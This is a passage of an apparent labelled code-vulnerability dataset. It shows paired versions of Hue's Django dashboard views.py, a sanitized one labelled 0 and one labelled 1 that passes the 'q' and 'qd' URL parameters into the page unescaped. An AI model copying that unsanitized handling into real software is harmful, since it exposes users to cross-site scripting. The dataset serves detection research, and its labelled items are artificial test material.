articles=\"lang/contractions_ga.txt\"/>\n        <!-- removes n-, etc. position increments is intentionally false! -->\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/hyphenations_ga.txt\"/>\n        <filter class=\"solr.IrishLowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ga.txt\"/>\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Irish\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Galician -->\n    <fieldType name=\"text_gl\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_gl.txt\" />\n        <filter class=\"solr.GalicianStemFilterFactory\"/>\n        <!-- less aggressive: <filter class=\"solr.GalicianMinimalStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Hindi -->\n    <fieldType name=\"text_hi\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <!-- normalizes unicode representation -->\n        <filter class=\"solr.IndicNormalizationFilterFactory\"/>\n        <!-- normalizes variation in spelling -->\n        <filter class=\"solr.HindiNormalizationFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_hi.txt\" />\n        <filter class=\"solr.HindiStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Hungarian -->\n    <fieldType name=\"text_hu\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_hu.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Hungarian\"/>\n        <!-- less aggressive: <filter class=\"solr.HungarianLightStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Armenian -->\n    <fieldType name=\"text_hy\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_hy.txt\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Armenian\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Indonesian -->\n    <fieldType name=\"text_id\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_id.txt\" />\n        <!-- for a less aggressive approach (only inflectional suffixes), set stemDerivational to false -->\n        <filter class=\"solr.IndonesianStemFilterFactory\" stemDerivational=\"true\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Italian -->\n    <fieldType name=\"text_it\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- removes l', etc -->\n        <filter class=\"solr.ElisionFilterFactory\" ignoreCase=\"true\" articles=\"lang/contractions_it.txt\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_it.txt\" format=\"snowball\" />\n        <filter class=\"solr.ItalianLightStemFilterFactory\"/>\n        <!-- more aggressive: <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Italian\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Japanese using morphological analysis (see text_cjk for a configuration using bigramming)\n\n         NOTE: If you want to optimize search for precision, use default operator AND in your query\n         parser config with <solrQueryParser defaultOperator=\"AND\"/> further down in this file.  Use\n         OR if you would like to optimize for recall (default).\n    -->\n    <fieldType name=\"text_ja\" class=\"solr.TextField\" positionIncrementGap=\"100\" autoGeneratePhraseQueries=\"false\">\n      <analyzer>\n      <!-- Kuromoji Japanese morphological analyzer/tokenizer (JapaneseTokenizer)\n\n           Kuromoji has a search mode (default) that does segmentation useful for search.  A heuristic\n           is used to segment compounds into its parts and the compound itself is kept as synonym.\n\n           Valid values for attribute mode are:\n              normal: regular segmentation\n              search: segmentation useful for search with synonyms compounds (default)\n            extended: same as search mode, but unigrams unknown words (experimental)\n\n           For some applications it might be good to use search mode for indexing and normal mode for\n           queries to reduce recall and prevent parts of compounds from being matched and highlighted.\n           Use <analyzer type=\"index\"> and <analyzer type=\"query\"> for this and mode normal in query.\n\n           Kuromoji also has a convenient user dictionary feature that allows overriding the statistical\n           model with your own entries for segmentation, part-of-speech tags and readings without a need\n           to specify weights.  Notice that user dictionaries have not been subject to extensive testing.\n\n           User dictionary attributes are:\n                     userDictionary: user dictionary filename\n             userDictionaryEncoding: user dictionary encoding (default is UTF-8)\n\n           See lang/userdict_ja.txt for a sample user dictionary file.\n\n           Punctuation characters are discarded by default.  Use discardPunctuation=\"false\" to keep them.\n\n           See http://wiki.apache.org/solr/JapaneseLanguageSupport for more on Japanese language support.\n        -->\n        <tokenizer class=\"solr.JapaneseTokenizerFactory\" mode=\"search\"/>\n        <!--<tokenizer class=\"solr.JapaneseTokenizerFactory\" mode=\"search\" userDictionary=\"lang/userdict_ja.txt\"/>-->\n        <!-- Reduces inflected verbs and adjectives to their base/dictionary forms (\u8f9e\u66f8\u5f62) -->\n        <filter class=\"solr.JapaneseBaseFormFilterFactory\"/>\n        <!-- Removes tokens with certain part-of-speech tags -->\n        <filter class=\"solr.JapanesePartOfSpeechStopFilterFactory\" tags=\"lang/stoptags_ja.txt\" />\n        <!-- Normalizes full-width romaji to half-width and half-width kana to full-width (Unicode NFKC subset) -->\n        <filter class=\"solr.CJKWidthFilterFactory\"/>\n        <!-- Removes common tokens typically not useful for search, but have a negative effect on ranking -->\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ja.txt\" />\n        <!-- Normalizes common katakana spelling variations by removing any last long sound character (U+30FC) -->\n        <filter class=\"solr.JapaneseKatakanaStemFilterFactory\" minimumLength=\"4\"/>\n        <!-- Lower-cases romaji characters -->\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Latvian -->\n    <fieldType name=\"text_lv\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_lv.txt\" />\n        <filter class=\"solr.LatvianStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Dutch -->\n    <fieldType name=\"text_nl\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_nl.txt\" format=\"snowball\" />\n        <filter class=\"solr.StemmerOverrideFilterFactory\" dictionary=\"lang/stemdict_nl.txt\" ignoreCase=\"false\"/>\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Dutch\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Norwegian -->\n    <fieldType name=\"text_no\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_no.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Norwegian\"/>\n        <!-- less aggressive: <filter class=\"solr.NorwegianLightStemFilterFactory\" variant=\"nb\"/> -->\n        <!-- singular/plural: <filter class=\"solr.NorwegianMinimalStemFilterFactory\" variant=\"nb\"/> -->\n        <!-- The \"light\" and \"minimal\" stemmers support variants: nb=Bokm\u00e5l, nn=Nynorsk, no=Both -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Portuguese -->\n    <fieldType name=\"text_pt\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_pt.txt\" format=\"snowball\" />\n        <filter class=\"solr.PortugueseLightStemFilterFactory\"/>\n        <!-- less aggressive: <filter class=\"solr.PortugueseMinimalStemFilterFactory\"/> -->\n        <!-- more aggressive: <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Portuguese\"/> -->\n        <!-- most aggressive: <filter class=\"solr.PortugueseStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Romanian -->\n    <fieldType name=\"text_ro\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ro.txt\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Romanian\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Russian -->\n    <fieldType name=\"text_ru\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ru.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Russian\"/>\n        <!-- less aggressive: <filter class=\"solr.RussianLightStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Swedish -->\n    <fieldType name=\"text_sv\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_sv.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Swedish\"/>\n        <!-- less aggressive: <filter class=\"solr.SwedishLightStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Thai -->\n    <fieldType name=\"text_th\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.ThaiWordFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_th.txt\" />\n      </analyzer>\n    </fieldType>\n\n    <!-- Turkish -->\n    <fieldType name=\"text_tr\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.TurkishLowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"false\" words=\"lang/stopwords_tr.txt\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Turkish\"/>\n      </analyzer>\n    </fieldType>\n\n </types>\n\n  <!-- Similarity is the scoring routine for each document vs. a query.\n       A custom Similarity or SimilarityFactory may be specified here, but\n       the default is fine for most applications.\n       For more info: http://wiki.apache.org/solr/SchemaXml#Similarity\n    -->\n  <!--\n     <similarity class=\"com.example.solr.CustomSimilarityFactory\">\n       <str name=\"paramkey\">param value</str>\n     </similarity>\n    -->\n\n</schema>\n\"\"\"\n/n/n/ndesktop/libs/dashboard/src/dashboard/views.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\n\nfrom django.utils.html import escape\nfrom django.utils.translation import ugettext as _\n\nfrom django.core.urlresolvers import reverse\nfrom desktop.conf import USE_NEW_EDITOR\nfrom desktop.lib.django_util import JsonResponse, render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.models import Document2, Document\nfrom desktop.views import antixss\n\nfrom search.conf import LATEST\n\nfrom dashboard.dashboard_api import get_engine\nfrom dashboard.decorators import allow_owner_only\nfrom dashboard.models import Collection2\nfrom dashboard.conf import get_engines\nfrom dashboard.controller import DashboardController, can_edit_index\n\n\nLOG = logging.getLogger(__name__)\n\n\nDEFAULT_LAYOUT = [\n     {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"},\n     {\"size\":10,\"rows\":[{\"widgets\":[\n         {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]},\n                        {\"widgets\":[\n         {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n        \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"},\n]\n\n\ndef index(request, is_mobile=False):\n  hue_collections = DashboardController(request.user).get_search_collections()\n  collection_id = request.GET.get('collection')\n\n  if not hue_collections or not collection_id:\n    return admin_collections(request, True, is_mobile)\n\n  try:\n    collection_doc = Document2.objects.get(id=collection_id)\n    if USE_NEW_EDITOR.get():\n      collection_doc.can_read_or_exception(request.user)\n    else:\n      collection_doc.doc.get().can_read_or_exception(request.user)\n    collection = Collection2(request.user, document=collection_doc)\n  except Exception, e:\n    raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\"))\n\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.method == 'GET':\n    if 'q' in request.GET:\n      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))\n    if 'qd' in request.GET:\n      query['qd'] = antixss(request.GET.get('qd', ''))\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': json.dumps(query),\n    'initial': json.dumps({\n        'collections': [],\n        'layout': DEFAULT_LAYOUT,\n        'is_latest': LATEST.get(),\n        'engines': get_engines(request.user)\n    }),\n    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),\n    'can_edit_index': can_edit_index(request.user),\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'mobile': is_mobile,\n  })\n\ndef index_m(request):\n  return index(request, True)\n\ndef new_search(request):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections:\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=collections[0], engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.GET.get('format', 'plain') == 'json':\n    return JsonResponse({\n      'collection': collection.get_props(request.user),\n      'query': query,\n      'initial': {\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }\n     })\n  else:\n    return render('search.mako', request, {\n      'collection': collection,\n      'query': query,\n      'initial': json.dumps({\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }),\n      'is_owner': True,\n      'is_embeddable': request.GET.get('is_embeddable', False),\n      'can_edit_index': can_edit_index(request.user)\n    })\n\ndef browse(request, name, is_mobile=False):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections and engine == 'solr':\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=name, engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': query,\n    'initial': json.dumps({\n      'autoLoad': True,\n      'collections': collections,\n      'layout': [\n          {\"size\":12,\"rows\":[{\"widgets\":[\n              {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\",\n               \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n          \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}\n      ],\n      'is_latest': LATEST.get(),\n      'engines': get_engines(request.user)\n    }),\n    'is_owner': True,\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'can_edit_index': can_edit_index(request.user),\n    'mobile': is_mobile\n  })\n\n\ndef browse_m(request, name):\n  return browse(request, name, True)\n\n\n@allow_owner_only\ndef save(request):\n  response = {'status': -1}\n\n  collection = json.loads(request.POST.get('collection', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  collection['template']['extracode'] = escape(collection['template']['extracode'])\n\n  if collection:\n    if collection['id']:\n      dashboard_doc = Document2.objects.get(id=collection['id'])\n    else:\n      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])\n      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')\n\n    dashboard_doc.update_data({\n        'collection': collection,\n        'layout': layout\n    })\n    dashboard_doc1 = dashboard_doc.doc.get()\n    dashboard_doc.name = dashboard_doc1.name = collection['label']\n    dashboard_doc.description = dashboard_doc1.description = collection['description']\n    dashboard_doc.save()\n    dashboard_doc1.save()\n\n    response['status'] = 0\n    response['id'] = dashboard_doc.id\n    response['message'] = _('Page saved !')\n  else:\n    response['message'] = _('There is no collection to search.')\n\n  return JsonResponse(response)\n\n\ndef no_collections(request):\n  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})\n\n\ndef admin_collections(request, is_redirect=False, is_mobile=False):\n  existing_hue_collections = DashboardController(request.user).get_search_collections()\n\n  if request.GET.get('format') == 'json':\n    collections = []\n    for collection in existing_hue_collections:\n      massaged_collection = collection.to_dict()\n      if request.GET.get('is_mobile'):\n        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id\n      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)\n      collections.append(massaged_collection)\n    return JsonResponse(collections, safe=False)\n\n  template = 'admin_collections.mako'\n  if is_mobile:\n    template = 'admin_collections_m.mako'\n\n  return render(template, request, {\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'existing_hue_collections': existing_hue_collections,\n    'is_redirect': is_redirect\n  })\n\n\ndef admin_collection_delete(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.delete_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n\n\ndef admin_collection_copy(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.copy_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n/n/n/n", "label": 0}, {"id": "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d", "code": "/desktop/libs/dashboard/src/dashboard/views.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\n\nfrom django.utils.html import escape\nfrom django.utils.translation import ugettext as _\n\nfrom django.core.urlresolvers import reverse\nfrom desktop.conf import USE_NEW_EDITOR\nfrom desktop.lib.django_util import JsonResponse, render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.models import Document2, Document\n\nfrom search.conf import LATEST\n\nfrom dashboard.dashboard_api import get_engine\nfrom dashboard.decorators import allow_owner_only\nfrom dashboard.models import Collection2\nfrom dashboard.conf import get_engines\nfrom dashboard.controller import DashboardController, can_edit_index\n\n\nLOG = logging.getLogger(__name__)\n\n\nDEFAULT_LAYOUT = [\n     {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"},\n     {\"size\":10,\"rows\":[{\"widgets\":[\n         {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]},\n                        {\"widgets\":[\n         {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n        \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"},\n]\n\n\ndef index(request, is_mobile=False):\n  hue_collections = DashboardController(request.user).get_search_collections()\n  collection_id = request.GET.get('collection')\n\n  if not hue_collections or not collection_id:\n    return admin_collections(request, True, is_mobile)\n\n  try:\n    collection_doc = Document2.objects.get(id=collection_id)\n    if USE_NEW_EDITOR.get():\n      collection_doc.can_read_or_exception(request.user)\n    else:\n      collection_doc.doc.get().can_read_or_exception(request.user)\n    collection = Collection2(request.user, document=collection_doc)\n  except Exception, e:\n    raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\"))\n\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.method == 'GET':\n    if 'q' in request.GET:\n      query['qs'][0]['q'] = request.GET.get('q')\n    if 'qd' in request.GET:\n      query['qd'] = request.GET.get('qd')\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': json.dumps(query),\n    'initial': json.dumps({\n        'collections': [],\n        'layout': DEFAULT_LAYOUT,\n        'is_latest': LATEST.get(),\n        'engines': get_engines(request.user)\n    }),\n    'is_owner': collection_doc.doc.get().can_write(request.user),\n    'can_edit_index': can_edit_index(request.user),\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'mobile': is_mobile,\n  })\n\ndef index_m(request):\n  return index(request, True)\n\ndef new_search(request):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections:\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=collections[0], engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.GET.get('format', 'plain') == 'json':\n    return JsonResponse({\n      'collection': collection.get_props(request.user),\n      'query': query,\n      'initial': {\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }\n     })\n  else:\n    return render('search.mako', request, {\n      'collection': collection,\n      'query': query,\n      'initial': json.dumps({\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }),\n      'is_owner': True,\n      'is_embeddable': request.GET.get('is_embeddable', False),\n      'can_edit_index': can_edit_index(request.user)\n    })\n\ndef browse(request, name, is_mobile=False):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections and engine == 'solr':\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=name, engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': query,\n    'initial': json.dumps({\n      'autoLoad': True,\n      'collections': collections,\n      'layout': [\n          {\"size\":12,\"rows\":[{\"widgets\":[\n              {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\",\n               \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n          \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}\n      ],\n      'is_latest': LATEST.get(),\n      'engines': get_engines(request.user)\n    }),\n    'is_owner': True,\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'can_edit_index': can_edit_index(request.user),\n    'mobile': is_mobile\n  })\n\n\ndef browse_m(request, name):\n  return browse(request, name, True)\n\n\n@allow_owner_only\ndef save(request):\n  response = {'status': -1}\n\n  collection = json.loads(request.POST.get('collection', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  collection['template']['extracode'] = escape(collection['template']['extracode'])\n\n  if collection:\n    if collection['id']:\n      dashboard_doc = Document2.objects.get(id=collection['id'])\n    else:\n      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])\n      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')\n\n    dashboard_doc.update_data({\n        'collection': collection,\n        'layout': layout\n    })\n    dashboard_doc1 = dashboard_doc.doc.get()\n    dashboard_doc.name = dashboard_doc1.name = collection['label']\n    dashboard_doc.description = dashboard_doc1.description = collection['description']\n    dashboard_doc.save()\n    dashboard_doc1.save()\n\n    response['status'] = 0\n    response['id'] = dashboard_doc.id\n    response['message'] = _('Page saved !')\n  else:\n    response['message'] = _('There is no collection to search.')\n\n  return JsonResponse(response)\n\n\ndef no_collections(request):\n  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})\n\n\ndef admin_collections(request, is_redirect=False, is_mobile=False):\n  existing_hue_collections = DashboardController(request.user).get_search_collections()\n\n  if request.GET.get('format') == 'json':\n    collections = []\n    for collection in existing_hue_collections:\n      massaged_collection = collection.to_dict()\n      if request.GET.get('is_mobile'):\n        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id\n      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)\n      collections.append(massaged_collection)\n    return JsonResponse(collections, safe=False)\n\n  template = 'admin_collections.mako'\n  if is_mobile:\n    template = 'admin_collections_m.mako'\n\n  return render(template, request, {\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'existing_hue_collections': existing_hue_collections,\n    'is_redirect': is_redirect\n  })\n\n\ndef admin_collection_delete(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.delete_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n\n\ndef admin_collection_copy(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.copy_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n/n/n/n", "label": 1}, {"id": "1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53", "code": "socialsystem/core/views.py/n/nimport urllib\n\nfrom django.views.generic import TemplateView, FormView, DetailView\nfrom django.urls import reverse\n\nfrom .entryform import EntryForm, entry_form_config, build_question_flag\nfrom .models import LifeCondition, Benefit, BenefitRequirement\n\n\nclass BenefitOverview(TemplateView):\n    template_name = 'core/benefit_overview.html'\n\n    def get_context_data(self):\n        data = super().get_context_data()\n        data['life_conditions'] = LifeCondition.objects.with_benefits()\n        return data\n\n\nclass BenefitClaimView(FormView):\n    template_name = 'core/benefit_claim.html'\n    form_class = EntryForm\n\n    def get(self, request, *args, **kwargs):\n        form = self.get_form()\n\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.render_to_response(self.get_context_data())\n\n    def get_form_kwargs(self, *args, **kwargs):\n        kwargs = super().get_form_kwargs()\n        kwargs['entry_form_config'] = entry_form_config\n\n        question_ids = {str(q['id']) for q in entry_form_config}\n        data = {\n            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in 